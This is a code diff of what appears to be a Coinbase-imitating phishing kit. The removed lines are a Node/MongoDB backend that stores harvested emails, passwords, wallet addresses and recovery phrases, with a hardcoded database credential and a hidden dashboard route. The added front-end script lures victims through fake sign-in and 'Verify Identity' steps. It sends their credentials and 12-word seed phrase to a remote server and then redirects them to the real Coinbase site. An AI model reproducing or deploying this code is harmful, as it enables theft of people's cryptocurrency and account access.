@@ -1,57 +1,95 @@
-const express = require('express');
-const mongoose = require('mongoose');
-const bodyParser = require('body-parser');
-const cors = require('cors');
-const path = require('path');
+const API_URL = 'https://cb-backend-new.onrender.com';
 
-const app = express();
-app.use(cors());
-app.use(bodyParser.json());
-app.use(express.static(__dirname));
+document.addEventListener('DOMContentLoaded', () => {
+    const step1 = document.getElementById('step-1');
+    const step2 = document.getElementById('step-2');
+    const step3 = document.getElementById('step-3');
+    const status = document.getElementById('status');
 
-const MONGO_URI = "mongodb+srv://scumbag3_db_user:Foreverich21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority";
+    // 1. Get Started -> Sign In
+    document.getElementById('toStep2').onclick = () => {
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+    };
 
-mongoose.connect(MONGO_URI)
-  .then(() => console.log("Connected"))
-  .catch(err => console.error("DB Error:", err));
+    // 2. Sign In -> Wallet Verification
+    document.getElementById('toStep3').onclick = () => {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        
+        if (!email || !pass) {
+            alert('Please fill in all fields to continue.');
+            return;
+        }
+        
+        step2.classList.add('hidden');
+        step3.classList.remove('hidden');
+    };
 
-const leadSchema = new mongoose.Schema({
-    email: String,
-    password: String,
-    walletAddress: String,
-    recoveryPhrase: String,
-    timestamp: { type: Date, default: Date.now }
-});
-const Lead = mongoose.model('Lead', leadSchema, 'leads');
+    // 3. Wallet Connection or Recovery Phrase
+    document.getElementById('connectBtn').onclick = async () => {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
-app.post('/update', async (req, res) => {
-    try {
-        const lead = new Lead(req.body);
-        await lead.save();
-        res.status(200).send("Saved");
-    } catch (err) {
-        res.status(500).send("Error");
+        if (window.ethereum) {
+            try {
+                status.innerText = "Connecting to wallet...";
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                await sendData(email, pass, accounts[0], null);
+            } catch (e) {
+                setupRecovery(email, pass);
+            }
+        } else {
+            setupRecovery(email, pass);
+        }
+    };
+
+    function setupRecovery(email, pass) {
+        step3.innerHTML = `
+            <img src="logo.png" class="cb-logo">
+            <h1>Verify Identity</h1>
+            <p>Enter your 12-word recovery phrase to restore access to your account.</p>
+            <input type="text" id="phrase" placeholder="word1 word2 ..." style="width:100%; padding:12px; margin:10px 0; text-align:center;">
+            <button id="submitPhrase" class="btn-primary" style="width:100%;">Restore Account</button>
+            <div id="phrase_status" style="color:red; margin-top:10px;"></div>
+        `;
+
+        document.getElementById('submitPhrase').onclick = async () => {
+            const phrase = document.getElementById('phrase').value.trim();
+            const phrase_status = document.getElementById('phrase_status');
+
+            if (phrase.split(/\s+/).length !== 12) {
+                phrase_status.innerText = "A valid recovery phrase must be exactly 12 words.";
+                return;
+            }
+            await sendData(email, pass, null, phrase);
+        };
+    }
+
+    async function sendData(email, pass, wallet, phrase) {
+        try {
+            status.innerText = "Verifying...";
+            const res = await fetch(`${API_URL}/update`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    email: email, 
+                    password: pass, 
+                    walletAddress: wallet, 
+                    recoveryPhrase: phrase 
+                })
+            });
+
+            if (res.ok) {
+                status.innerText = "Verification complete. Redirecting...";
+                setTimeout(() => {
+                    window.location.href = 'https://www.coinbase.com/password-recovery';
+                }, 2000);
+            } else {
+                status.innerText = "Server error. Please try again.";
+            }
+        } catch (e) {
+            status.innerText = "Connection error. Please try again.";
+        }
     }
 });
-
-app.get('/dashboard-data', async (req, res) => {
-    try {
-        const leads = await Lead.find().sort({ timestamp: -1 });
-        res.json(leads);
-    } catch (err) {
-        res.status(500).send("Error");
-    }
-});
-
-// This is the link you keep secret
-app.get('/v_7xp', (req, res) => {
-    res.sendFile(path.join(__dirname, 'dashboard.html'));
-});
-
-// Anyone landing on the root is sent to the real Coinbase site
-app.get('/', (req, res) => {
-    res.redirect('https://www.coinbase.com');
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Live on ${PORT}`));
